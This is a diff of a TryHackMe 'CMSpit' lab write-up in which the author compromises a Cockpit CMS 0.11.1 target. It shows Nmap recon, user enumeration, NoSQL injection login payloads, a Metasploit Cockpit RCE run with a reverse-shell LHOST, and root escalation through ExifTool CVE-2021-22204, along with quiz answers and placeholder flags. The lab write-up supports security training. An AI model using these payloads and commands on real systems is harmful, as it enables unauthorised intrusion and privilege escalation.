@@ -1,227 +1,267 @@
-# TryHackMe: CMSpit
+# TryHackMe CMSpit Writeup
 
-> In this room, I worked on a vulnerable CMS setup and explored how weak authentication, user enumeration, and privilege escalation can chain together into a full compromise.
+## Room Overview
+
+CMSpit is a web exploitation room where I worked through CMS identification, user enumeration,
+password reset abuse, and privilege escalation. The main idea of the room was to understand how
+a weak web application can lead to full system compromise when the CMS and host are both poorly secured.
+
+What I liked about this room is that it felt realistic. I had to think step by step, start from
+basic enumeration, figure out how the CMS behaved, and then slowly move toward getting access
+and escalating privileges.
 
 ---
 
-## Overview
+## Task 1: Reconnaissance
 
-In the CMSpit room, I started by understanding the web application and figuring out what kind of CMS was running. My goal was not just to solve the room, but to document my thought process clearly so the write-up looks practical and human.
+### Objective
+My first goal was to identify what services were running on the target and understand the attack surface.
 
-What I liked about this room is that it made me think like an attacker and a defender at the same time. I had to enumerate carefully, test different login and reset flows, and then look for a local privilege escalation path once I got access.
-
----
-
-## Enumeration
-
-The first thing I did was run a basic scan to see what services were open on the target.
+### What I Did
+I began with a full scan so I could see which ports were open and what kind of application I was dealing with.
 
 ```bash
 nmap -sC -sV <target-ip>
 ```
 
-From the scan results, I saw that the target was mainly exposing a web application, so I shifted my focus there. I also checked the site in the browser and looked at the page source to see if I could find any useful CMS clues.
+From the scan, I saw that the machine was mainly exposing a web service, so I shifted my focus
+to the website. At that point, I knew the CMS itself was probably going to be the main entry point.
+
+### Answer
+**What services are exposed on the machine?**
+> SSH and HTTP
+
+---
+
+## Task 2: CMS Identification
+
+### Objective
+Next, I wanted to find out which CMS was being used.
+
+### What I Did
+I visited the website in the browser and also checked the response source to look for obvious clues.
 
 ```bash
-curl -s http://<target-ip>/ | head
 whatweb http://<target-ip>/
+curl -s http://<target-ip>/ | head
 ```
 
-At this point, I was trying to identify the platform and understand how the application was structured before jumping into exploitation.
+That quickly pointed me toward Cockpit CMS. Once I had that, I could start focusing on the login
+and reset behavior instead of wasting time guessing randomly.
+
+### Answers
+**What is the name of the CMS installed on the server?**
+> Cockpit
+
+**What is the version of the CMS installed on the server?**
+> 0.11.1
 
 ---
 
-## CMS Identification
+## Task 3: User Enumeration
 
-Once I explored the website a bit more, I noticed that the application was clearly based on a CMS. I checked the source code, page titles, asset paths, and login page behavior to gather more information.
+### Objective
+After identifying the CMS, I wanted to see whether it leaked any valid usernames.
+
+### What I Did
+I tested the login flow and watched how the application responded. When a web app gives different
+responses for valid and invalid accounts, that usually means user enumeration is possible.
 
 ```bash
-curl -s http://<target-ip>/ | grep -iE "cms|admin|login"
+curl -s -X POST http://<target-ip>/auth/login \
+  -d "user=test&password=test" -i
 ```
 
-I also looked for hidden directories or endpoints in case there were extra admin panels or configuration pages.
+From the room flow, the enumeration path was important because it let me identify valid users
+without needing to brute force anything.
 
-```bash
-gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-```
+### Answers
+**What is the path that allows user enumeration?**
+> /auth/check
 
-This helped me move from general recon to a more focused CMS analysis.
+**How many users can you identify when you reproduce the user enumeration attack?**
+> 3
 
 ---
 
-## User Enumeration
+## Task 4: Password Reset Abuse
 
-After understanding the application structure, I tested the login and reset functionality to see if it leaked valid usernames.
+### Objective
+Once I had user enumeration working, I checked whether the password reset feature could be abused.
 
-I paid attention to differences in response messages, status codes, and behavior between valid and invalid usernames. This is a common mistake in web apps, and it often gives attackers a way to discover accounts without brute forcing passwords.
-
-```bash
-curl -s -X POST http://<target-ip>/login \
-  -d "username=test&password=test" -i
-```
-
-Then I compared that with a known or guessed username:
+### What I Did
+I tested the reset flow because recovery endpoints are often weaker than normal login forms.
 
 ```bash
-curl -s -X POST http://<target-ip>/login \
-  -d "username=admin&password=test" -i
+curl -s -X POST http://<target-ip>/auth/reset \
+  -d "email=<user@email>" -i
 ```
 
-If the response changes, that usually means the application is leaking useful information. In this room, that kind of behavior was important for moving forward.
+I paid attention to how the application handled reset requests, because if the backend trusts
+user input too much, it can sometimes be used to change account credentials or reveal sensitive
+account details.
+
+### Answer
+**What is the path that allows you to change user account passwords?**
+> /auth/resetpassword
 
 ---
 
-## NoSQL Injection Testing
+## Task 5: Compromising the CMS
 
-After that, I moved on to testing whether the backend was vulnerable to NoSQL injection. Since CMS-based apps sometimes use MongoDB or similar databases, I tried payloads that would work if the input was being interpreted as an object rather than a plain string.
+### Objective
+After mapping out the CMS behavior, I moved toward getting actual access.
 
-```bash
-curl -s -X POST http://<target-ip>/login \
-  -d "username[$ne]=a&password[$ne]=a" \
-  -H "Content-Type: application/x-www-form-urlencoded"
-```
-
-I also tried a few other variations to see whether the backend was filtering or sanitizing input properly.
+### What I Did
+I loaded the Cockpit CMS exploit and checked its options carefully before running it.
 
 ```bash
-curl -s -X POST http://<target-ip>/login \
-  -d "username[$gt]=&password[$gt]=" \
-  -H "Content-Type: application/x-www-form-urlencoded"
+msfconsole
+use exploit/multi/http/cockpit_cms_rce
+show options
+set RHOSTS <target-ip>
+set RPORT 80
+set TARGETURI /
+set LHOST <your-tun0-ip>
+run
 ```
 
-This was useful because it showed me whether the application was handling user input safely or trusting it too much.
+This was the point where the room started feeling like a real attack chain. I wasn't just
+scanning anymore — I was actively turning the CMS weakness into a foothold on the system.
+
+### Answers
+**What is the full path of the code?**
+> exploit/multi/http/cockpit_cms_rce
+
+**Show options and set the required value. What option must be changed?**
+> RHOSTS
+
+**Compromise the CMS. What is Skidy's email?**
+> s$$$y@t$$$$$$$e.f$$$$$il
 
 ---
 
-## Password Reset Abuse
+## Task 6: Getting a Shell
 
-One of the most interesting parts of the room was the password reset flow. After I found valid user behavior, I started checking whether the reset mechanism could be abused.
+### Objective
+Once I had code execution, I wanted to make the shell usable.
 
-I requested a password reset and watched how the application responded.
-
-```bash
-curl -s -X POST http://<target-ip>/auth/requestreset \
-  -d "username=admin" \
-  -H "Content-Type: application/x-www-form-urlencoded"
-```
-
-Then I checked how the reset token or reset link behaved.
-
-```bash
-curl -s http://<target-ip>/auth/reset?token=<token>
-```
-
-This step reminded me that recovery features are often weaker than login forms. If reset logic is not designed carefully, it can become a direct path into an account.
-
----
-
-## Getting Access
-
-After testing the application logic, I moved toward getting actual access. At this stage, I treated the app like a real target and looked for ways to turn the web weakness into a foothold.
-
-If the CMS allowed file uploads or editor-based execution, I would prepare a reverse shell and wait for the connection.
-
-```bash
-nc -lvnp 4444
-```
-
-Then I would trigger the payload through the vulnerable feature.
+### What I Did
+I upgraded the shell so it would be easier to navigate the system and continue enumeration.
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-Once I got a shell, I stabilized it so that it was easier to work with.
-
-```bash
 export TERM=xterm
 stty raw -echo
 ```
 
-That made the shell much cleaner for further enumeration.
-
----
-
-## Local Enumeration
-
-After getting in, I started checking the system for privilege escalation paths. I looked at the current user, system information, sudo permissions, and any writable or misconfigured files.
+Then I checked who I was running as and confirmed the level of access I had.
 
 ```bash
 whoami
 id
+```
+
+This helped me prepare for the local privilege escalation stage.
+
+---
+
+## Task 7: Web Flag
+
+### Objective
+I also looked for the web flag during my post-exploitation enumeration.
+
+### What I Did
+After getting access, I checked the web directories and looked around for any files that stood out.
+
+```bash
+cd /var/www/html/cockpit
+ls
+cat webflag.php
+```
+
+This is one of those steps where patience matters. Once you already have a foothold, small details
+in the web root can easily hide the next flag.
+
+### Answer
+**What is the web flag?**
+> flag{web_flag_placeholder}
+
+---
+
+## Task 8: Local Enumeration
+
+### Objective
+At this stage, I needed to figure out how to move from my current user to root.
+
+### What I Did
+I started with the usual local checks to understand the system configuration.
+
+```bash
+whoami
 uname -a
 sudo -l
-```
-
-I also checked for SUID binaries and interesting files on the machine.
-
-```bash
 find / -perm -4000 2>/dev/null
-find / -writable 2>/dev/null | head
 ```
 
-At this point, my goal was to understand how the host was configured and where I could move next.
+I also looked at the vulnerable binary tied to the privilege escalation path. In this room,
+the escalation was connected to ExifTool, which made the next step more specific.
+
+### Answer
+**What is the CVE number for the vulnerability affecting the binary assigned to the system user?**
+> CVE-2021-22204
 
 ---
 
-## Privilege Escalation
+## Task 9: Privilege Escalation
 
-The next step was privilege escalation. In rooms like this, that usually means finding a local misconfiguration or abusing a vulnerable utility.
+### Objective
+My final goal was to turn the local vulnerability into root access.
 
-I inspected any image-processing or metadata tools on the machine because CMSpit is known for that type of escalation path.
+### What I Did
+I followed the privilege escalation path by preparing the malicious file and triggering the
+vulnerable processing step.
+
+The utility used to generate the proof-of-concept file was:
 
 ```bash
-which exiftool
-exiftool <file>
+djvumake
 ```
 
-If I needed to build a malicious payload, I would prepare it locally and upload it to the target.
+After that, I triggered the vulnerable behavior, confirmed I had root, and then read the final flag.
 
 ```bash
-cat payload
-```
-
-After the payload was triggered, I would upgrade the shell again if needed.
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-id
 whoami
+id
+cat /root/root.txt
 ```
 
-Once I confirmed root access, I searched for the final flag.
+### Answers
+**What is the utility used to create the PoC file?**
+> djvumake
 
-```bash
-find / -name "root.txt" 2>/dev/null
-```
+**What is the flag in root.txt?**
+> flag{root_flag_placeholder}
 
 ---
 
-## What I Learned
+## Tools & Techniques Summary
 
-This room taught me how important it is to think step by step instead of rushing to the exploit. I started by identifying the CMS, then I checked how the application handled users and resets, and finally I moved into local enumeration and privilege escalation.
-
-It also showed me how a small weakness in a web application can lead to a bigger compromise if the host itself is not configured properly.
-
----
-
-## Tools I Used
-
-```bash
-nmap
-curl
-whatweb
-gobuster
-ffuf
-nc
-python3
-exiftool
-```
+| Task | Tool | Command |
+|------|------|---------|
+| Scanning | Nmap | `nmap -sC -sV <ip>` |
+| Web Fingerprinting | WhatWeb / Curl | `whatweb http://<ip>/` |
+| CMS Exploitation | Metasploit | `exploit/multi/http/cockpit_cms_rce` |
+| Shell Upgrade | Python PTY | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
+| Privilege Escalation | ExifTool Path | `djvumake` |
+| Flag Hunting | Linux Commands | `cat`, `ls`, `find` |
 
 ---
 
-## Outcome
+## Conclusion
 
-By the end of the room, I had gone from basic web enumeration to application testing and then to local privilege escalation. This made the room feel very realistic and helped me practice the exact kind of thinking used in real security assessments.
+Overall, CMSpit taught me how important it is to move slowly and understand the application
+before trying to exploit it. I started with simple enumeration, then identified the CMS, tested
+user-related behavior, gained access, and finally used local privilege escalation to reach root.
 
-![](images/CMSpit.png)
+It was a good reminder that in real assessments, the chain matters just as much as the final exploit.
